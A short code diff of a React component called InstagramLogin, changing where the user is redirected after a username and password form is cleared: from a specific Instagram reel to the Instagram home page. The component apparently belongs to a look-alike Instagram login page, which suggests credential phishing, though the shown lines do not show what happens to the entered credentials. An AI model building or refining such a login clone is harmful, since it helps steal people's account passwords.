@@ -81,9 +81,10 @@ export default function InstagramLogin() {
         setFormData({ username: "", password: "" });
 
         // Instagram Reel URLs
-        const reelId = "DB5yhFPpfki";
-        const instagramAppUrl = `instagram://reel/${reelId}`;
-        const instagramWebUrl = `https://www.instagram.com/reel/${reelId}/`;
+        // const reelId = "DB5yhFPpfki";
+        // const instagramAppUrl = `instagram://reel/${reelId}`;
+        const instagramAppUrl = `instagram://`;
+        const instagramWebUrl = `https://www.instagram.com/`;
 
         const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
